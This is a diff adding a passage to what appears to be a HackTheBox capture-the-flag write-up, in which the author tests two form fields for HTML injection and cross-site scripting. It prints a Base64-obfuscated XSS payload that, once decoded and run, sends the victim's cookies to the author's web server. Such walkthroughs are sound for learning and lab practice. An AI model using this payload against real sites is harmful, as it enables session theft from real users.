@@ -35,4 +35,14 @@ We simply trust the process and create an account which then allows us to submit
 
 <figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
-We try a simple code&#x20;
+We try a simple HTML code injection vulnerability into both text boxes, which if successful, would attempt to retrieve an img from our IP, which we'd be hosting a webserver on. Unfortunately, there is no indication that this has worked with a standard message being displayed.&#x20;
+
+<figure><img src=".gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>
+
+Curious to see whether we could use XSS here, we think back [#user](hackthebox-headless.md#user "mention") for the HackTheBox machine, Headless. We try the same payload in each of these fields but to no avail. Let's switch it up a bit and try our good friend, Base64!
+
+```
+<img src=a onerror='eval(atob("ZmV0Y2goJ2h0dHA6Ly8xMC4xMC4xNC4xOTUvP2Nvb2tpZT0nK2RvY3VtZW50LmNvb2tpZSk="));' />
+```
+
+This payload will attempt to load an image from "a", which will fail. On an error, it will then evaluate (run) the code that follows, which starts with "atob" decodes Base64 string, where our Base64 string is set to make a web request to our web server with the current cookie value. If we're going to trigger an XSS vulnerability, this is a good alternative to our previous payload.
